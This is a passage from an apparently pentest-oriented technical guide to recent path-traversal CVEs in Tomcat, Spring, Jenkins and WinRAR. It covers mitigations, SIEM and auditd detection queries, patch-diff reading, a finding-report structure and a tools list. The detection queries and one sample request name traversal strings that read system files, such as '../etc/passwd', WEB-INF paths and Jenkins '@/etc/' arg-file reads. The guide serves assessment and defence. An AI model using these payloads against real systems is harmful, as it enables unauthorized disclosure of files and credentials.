- **CVE-2025-55752**: disable the Rewrite Valve entirely if not needed; move Rewrite rules to a proxy layer (Nginx `rewrite` or Apache `mod_rewrite` fronting Tomcat) that pre-normalizes before forwarding.
- **CVE-2024-38819**: switch the resource location from `FileSystemResource` to `ClassPathResource`; removes precondition 2. Alternative: replace `RouterFunctions.resources()` with an annotation-based controller that uses `Files.readAllBytes()` with an explicit canonicalization check.
- **CVE-2024-23897**: disable the CLI over HTTP via `/manage/configureSecurity/` → "TCP port for inbound agents" set to `Disable` (removes the CLI-remoting endpoint); this doesn't disable the CLI itself but removes the network reach.
- **CVE-2025-6218**: for server-side archive extraction, wrap the extractor in a chroot or user-namespace container; the class fires but is contained. For desktop WinRAR, mandate upgrade or replace with an alternative extraction tool (7-Zip, PeaZip) whose extraction pipeline differs.

**SIEM query examples per CVE (defender-side):**

Detection queries in common SIEM syntax; adjust to your target's schema.

```
# CVE-2025-55752 — Tomcat Rewrite traversal against WEB-INF
# Splunk / Elasticsearch KQL-shape
index=web_access sourcetype=tomcat*
  ( uri:*%2e%2e/WEB-INF/* OR uri:*..%2fWEB-INF/* OR uri:*%2e%2e/META-INF/* )
  status IN (200, 206)
| stats count by src_ip, uri, status

# CVE-2024-38819 — Spring functional-web static-route traversal
index=web_access
  uri:/static/*/../* OR uri:/resources/*/../* OR uri:*/../application.properties
  ( status:200 OR status:206 )
| stats count by src_ip, uri

# CVE-2024-23897 — Jenkins CLI arg-file expansion
index=jenkins_audit_log
  ( command_args:*@/etc/* OR command_args:*@/var/* OR command_args:*@/root/*
    OR command_args:*@C:\\* OR command_args:*@/proc/* )
| stats count by user, src_ip, command, command_args

# CVE-2025-6218 — server-side Zip-Slip extraction
# Filesystem auditd rule (Linux):
-w /var/uploads -p wa -k upload_write
-a exit,always -F arch=b64 -S openat -F path=~/../.. -k traversal_open
# Correlate with extraction service PID; any openat where the resolved path is outside /var/uploads is anomalous.

# For all four — traversal payloads in HTTP request bodies (POST-body variant):
index=web_access method=POST
  ( body:*%2e%2e/* OR body:*../etc/passwd OR body:*C:\\Windows* )
| stats count by src_ip, uri, method
```

Correlate SIEM alerts with authentication events: a spike in traversal-shape queries from a single source without preceding auth activity is a scanner; the same shape following auth is either an authorized assessment or a compromised account.

**Post-fix regression watch — what to monitor after a fix ships:**

Fixed CVEs regress. The specific things to monitor for each of the batch-6 fixes:

- **CVE-2025-55752** — watch for new Tomcat CVEs in the Rewrite Valve or URI-parsing subsystem for the following two years; the class of "check-then-refactor decay" recurs on this codebase.
- **CVE-2024-38819** — watch for Spring CVEs affecting `RouterFunctions.resources()` or the `Resource` bean hierarchy; the functional-web resource resolution has ongoing refactoring.
- **CVE-2024-23897** — watch for new args4j-related CVEs, in Jenkins core and in plugins. The primitive can reappear at the plugin layer independently.
- **CVE-2025-6218** — watch for new archive-extraction CVEs across the archive-library ecosystem (WinRAR, 7-Zip, `unzipper`, `node-tar`, `zipfile`). Each library's own release notes and CVE database should be monitored.

## Patch-Diff Reading for Traversal Classes

Reading the actual patch diff for a fixed vulnerability answers questions that the advisory doesn't: does the fix address the class or just this instance? Does the fix introduce a check on canonical form, or does it move the canonicalization? Which regression pattern (§ Modern Regression Patterns) is the fix susceptible to?

**How to read a traversal-fix patch:**

1. **Identify the security-relevant call** — the fix should touch a code path that (a) parses or normalizes a URL/path, or (b) checks a URL/path against a policy, or (c) opens or resolves a file at a URL/path.
2. **Identify the class of change** — is the fix adding a check (defense-in-depth), removing a code path (elimination), changing the input to a check (canonicalization tightening), or changing the check's algorithm (rule tightening)?
3. **Identify the regression susceptibility** — for the four regression patterns:
   - Check-then-refactor decay: is the fix adding a check that relies on an invariant elsewhere in the code base? If yes, susceptible.
   - Hardened default with opt-in: is the fix a default-change plus a preserved opt-in? If yes, susceptible via opt-in.
   - Constrained parser with unconstrained pre-processor: does the fix operate at the parser layer while leaving pre-processors untouched? If yes, susceptible.
   - Two parsers on one wire: does the fix change one parser without changing others that see the same input? If yes, susceptible.
4. **Test the fix against the class** — construct a payload that would have exploited the pre-fix code and verify the post-fix code rejects it. Additionally, construct variants that a shallow reading of the fix would suggest still work; those variants are the residual class exposure.

**Patch-reading applied to CVE-2025-55752:**

The fix must restore the invariant "URI-decoding happens before path-canonicalization checks." The patch commit (visible in the Tomcat git repository at github.com/apache/tomcat) modifies the Rewrite Valve's URI-handling flow to decode the URI before checking against `/WEB-INF/` and `/META-INF/` patterns. This is a rule-tightening fix on the parser side — the check's algorithm is unchanged, but the input the check receives is now the decoded form.

Susceptibility: the fix depends on the decoding pass running before the check. A future refactor that moves decoding to a different phase (e.g., after check for perceived performance reasons) reintroduces the class. This is the exact pattern of the original regression. A defender monitoring for reintroduction would watch for Tomcat commits touching `RewriteValve`, `URIProcessor`, `Coyote`'s URI-handling classes; each is a candidate refactor site.

**Patch-reading applied to CVE-2024-38819:**

The fix must ensure that the resource resolver canonicalizes the requested path against the resource location before opening. The patch (visible in the Spring Framework git repository) modifies the `ResourceHandlerRegistration` or the `RouterFunctions.resources` implementation to apply a canonicalization + containment check. The change is defense-in-depth on the effect layer — adds a check that would have prevented the exploit.

Susceptibility: an alternative code path that uses a different resource resolver (e.g., a custom `ResourceHandler` bean) might not inherit the fix. Any application that extends Spring's static-file serving with a custom handler is a candidate for the residual class exposure.

**Patch-reading applied to CVE-2024-23897:**

The fix must disable args4j's `expandAtFiles` on the Jenkins CLI code path. The patch modifies the `CmdLineParser` construction to call `withAtSyntax(false)` before parsing. This is an elimination fix — the vulnerable feature is turned off entirely on the affected code path.

Susceptibility: any plugin that constructs its own `CmdLineParser` for its own CLI commands does not inherit the fix. Plugin authors must apply the same disable independently.

**Patch-reading applied to CVE-2025-52888 (Allure Report — canonical form example from the XXE batch):**

Even though this CVE is XXE (not traversal), its patch shape is instructive for the path-traversal patch-reading skill. The fix does NOT apply the standard OWASP hardening (`FEATURE_SECURE_PROCESSING true` + `disallow-doctype-decl`). Instead it installs a custom `ClasspathEntityResolver` on `DocumentBuilder` and calls `factory.setValidating(false)`. The mechanism: entity resolution still runs, but external entities can only be resolved from the JVM classpath (not from arbitrary file:// or http:// URIs).

Susceptibility: the resolver-swap fix is narrower than the disable-DOCTYPE fix. If an attacker can smuggle a DTD-URL that resolves to a classpath resource with entity-defining content, the class may reappear. The traversal analogue: a fix that restricts the reachable filesystem region rather than eliminating the traversal primitive is narrower than the elimination fix; test both dimensions.

## Documenting Class Findings vs CVE Findings

Not every finding is a CVE. The class shapes identified in this file (canonicalization uniqueness, the four modern regression patterns, the architectural classes in `path_traversal_lfi_rfi_advanced_deep.md`) produce findings that don't map to a single CVE identifier. Reporting them requires a different structure than a CVE-anchored finding.

**Class-finding report structure:**

1. **Class name** — the general shape, using established terminology where possible (Zip Slip, `/..;/` path-parameter divergence, alias off-by-slash, check-then-refactor decay). If the class doesn't have an established name, coin a descriptive one.
2. **Concrete instance at this target** — the specific code path, request shape, and observed behavior that manifests the class.
3. **Preconditions** — what specific configuration or code choices at this target make the class applicable. Include what would eliminate it.
4. **Evidence** — the paired probe (in-root control + out-of-root probe) and the observable delta. Include exact HTTP request/response captures.
5. **Impact class** — disclosure / partial-disclosure / write / execution, with the specific artifact reached or written. Do not conflate the primitive's ceiling with what you demonstrated.
6. **Related published CVEs** — cite the closest published CVE(s) for context. Clarify that the finding is the class, not the specific CVE — the target is not affected by the CVE's specific patch, but is affected by the class the CVE exemplifies.
7. **Remediation** — reference the general defensive pattern (canonicalize then verify) and any framework-specific hardening (Werkzeug's `safe_join`, Express's `sendFile` with `root` option) that applies.

**Distinguishing CVE finding from class finding in prose:**

- CVE finding: "The target runs Tomcat 10.1.40, which is affected by CVE-2025-55752. Encoded-traversal `%2e%2e/` reaches `/WEB-INF/web.xml`, disclosing servlet configuration. Fix: upgrade to Tomcat 10.1.45+."
- Class finding: "The target's static-file handler exhibits the alias off-by-slash class (see also: Orange Tsai's 2018 disclosure). Nginx configuration `location /static { alias /var/www/static/; }` combined with request `GET /static../secret.conf` returns content from outside the alias root. No specific CVE — the config pattern is documented as unsafe by Nginx maintainers. Fix: add a trailing `/` to the location prefix (`location /static/`)."

Both forms are legitimate findings; using CVE language for a class finding implies a fix path that doesn't exist ("upgrade to X"), and using class language for a CVE finding misses the specific patched-version boundary that the CVE provides.

**When the target is affected by both a CVE and its underlying class:**

Sometimes both apply — the target runs a vulnerable version AND has additional configuration that would make it exploitable by a class expression even after the CVE patch. Report both: the CVE with its patch path, and the class with its configuration-hardening path. The CVE fix addresses the specific version; the class fix addresses the durable defect.

## Adjacent 2024–2026 CVE Cluster

Beyond the four batch-6 primary CVEs dissected above, the current-frontier surface includes verified adjacent CVEs that share the class shape but at narrower or more targeted expressions. Each is persisted in the batch artifact directory; version boundaries verified against NVD.

- **CVE-2024-23829 (`aiohttp` static-file traversal on Windows)** — the Windows expression of the class in Python's aiohttp: case-folding-vs-string-comparison mismatch on NTFS. Applies only on Windows targets; on Linux the class doesn't fire. Grep for `aiohttp.web.static` on Windows deployments. Fixed in aiohttp 3.9.2.
- **CVE-2024-10220 (Kubernetes `gitRepo` volume)** — the kubelet's `gitRepo` volume type executed `git clone` on the host with attacker-influenceable arguments; the deprecated volume type remained functional through the 1.31 line. Class shape: user-input-to-file-operation on a privileged host process. Route to the container/k8s skills; the traversal-adjacent primitive is the host-side write.
- **CVE-2024-9042 (Kubernetes Windows-node command injection)** — command injection via kubelet on Windows nodes; not path traversal directly, but the same "trust-boundary-crossing input reaches host file operation" shape. Cited here for completeness of the K8s frontier.
- **CVE-2025-30066 (`tj-actions/changed-files` supply-chain)** — GitHub Actions supply-chain compromise (March 2025); action-tag hijack that exfiltrated CI secrets. Not path traversal, but the exposed impact class (arbitrary read of CI environment / workspace) overlaps identically with what Allure CVE-2025-52888 achieves via XXE — the CI attack surface is broader than a single vulnerability class.
- **CVE-2023-24329 (Python `urllib.parse`)** — URL-parsing traversal-adjacent where blank characters in URLs bypassed blocklist checks. Fixed in Python 3.11.4 / 3.10.12. Applies to any Python code using `urllib.parse` for URL validation followed by a fetch.

**Interpretation for assessment prioritization:** the batch-6 primary four are the CVE-verified anchors; this cluster is context. When assessing a target, fingerprint against the primary four first; if the target is affected by any of them, escalate accordingly. If not, this cluster is a secondary sweep — check the target's use of `aiohttp` on Windows, its Kubernetes version + `gitRepo` volume usage, its Python `urllib.parse` version, its GitHub Actions dependency graph for the compromised action.

**Class-recurrence rate:** across 2024–2026, path-traversal / LFI / RFI CVEs and related-class CVEs surface every 1–3 months in the primary Java/PHP/Python/Node ecosystems, with occasional archive-format (WinRAR, `node-tar`) and container-runtime CVEs interspersed. The specific list above is the current-frontier subset; the rate implies the list will grow through the next batch's cycle.

## Tools and References

Concrete tools and repositories referenced across this file, for reproducibility and further verification:

- **Synacktiv `php_filter_chain_generator`** — the canonical PHP filter-chain LFI→RCE generator, github.com/synacktiv/php_filter_chain_generator; used in the batch-6 measurement (persisted at `.zen-batch-artifacts/batch-6-*/measurements/php-filter-chain/`).
- **Gixy** — Nginx config linter that flags `alias` off-by-slash and other config-class traversal patterns, github.com/yandex/gixy.
- **Zip-Slip PoC tools** — `evilarc` for archive-based traversal test archives; Snyk's original Zip-Slip repository has language-specific PoCs.
- **args4j** — the Java CLI arg-parsing library at the heart of Jenkins CVE-2024-23897, github.com/kohsuke/args4j.
- **CVE JSON archives** — per-batch persistence at `.zen-batch-artifacts/batch-6-*/cve-json/` and `.../ghsa-json/`; each cited CVE has a corresponding file with the raw NVD/GHSA JSON as of the batch date.
- **arXiv preprints referenced** — `2608.06508` (canonicalization systematization; cited with inline caveat only), `2405.17737` (HTTP Garden; cross-referenced to `http_request_smuggling.md`).
- **CISA KEV catalog** — cisa.gov/known-exploited-vulnerabilities-catalog; the source of "live under active enforcement" claims (CVE-2025-6218 added 2025-12-09).
- **Historical Zip-Slip disclosure** — snyk.io/research/zip-slip-vulnerability, the 2018 formal disclosure that established the class terminology and cross-library inventory.
- **Orange Tsai's 2018 Black Hat USA paper** — "Breaking Parser Logic: Take Your Path Normalization Off And Pop 0Days Out" — the source of the Nginx `alias` off-by-slash and Java-backend `/..;/` architectural classes (dissected at operational depth in `path_traversal_lfi_rfi_advanced_deep.md`).

## Assessment Deliverable Template

For a path traversal finding at the current frontier, the deliverable should include:

- **Class or CVE anchor** — cite CVE-2025-55752/CVE-2024-38819/CVE-2024-23897/CVE-2025-6218 where applicable, or the architectural class (`/..;/`, Nginx alias off-by-slash) where CVE-less.
- **Target stack + version** — Tomcat / Spring / Jenkins / WinRAR / other with specific version.
- **Sink shape** — read / evaluate / import / write / copy / fetch-and-inline.
- **Confirmation evidence** — paired in-root + out-of-root control with exact response bytes.
- **Impact chain** — downstream classes reached (disclosure → credentials → cloud pivot; write-to-exec via resolver chain).
- **Version boundary** — where the fix landed, or where the target sits in the affected range.
- **Preconditions** — all-of-N gates identified (dual precondition for Spring, PUT-enabled for Tomcat RCE, etc.).
- **Compensating controls** — what reduces exposure per the CVE / class.

## Summary

The 2024–2026 path-traversal frontier is dominated by four CVE families with specific class shapes — a normalize-before-decode regression (Tomcat), a functional-web-API AND-gate finding (Spring), an argument-file-expansion primitive (Jenkins), and an archive-extraction class expression (WinRAR / web-upload framing). The systematization frame (canonicalization uniqueness with object-side and code-side representation divergence) provides a lens for spotting the next expression, and the modern regression patterns predict where the next class instance will appear. Fingerprint every target against the version tables persisted in the batch artifacts; escalate cautiously with a paired in-root control; distinguish CVE findings from class findings in reporting; and route architectural classes (Nginx `alias`, `/..;/`) to the advanced sibling and smuggling-related URL-parser divergences to `http_request_smuggling.md`.
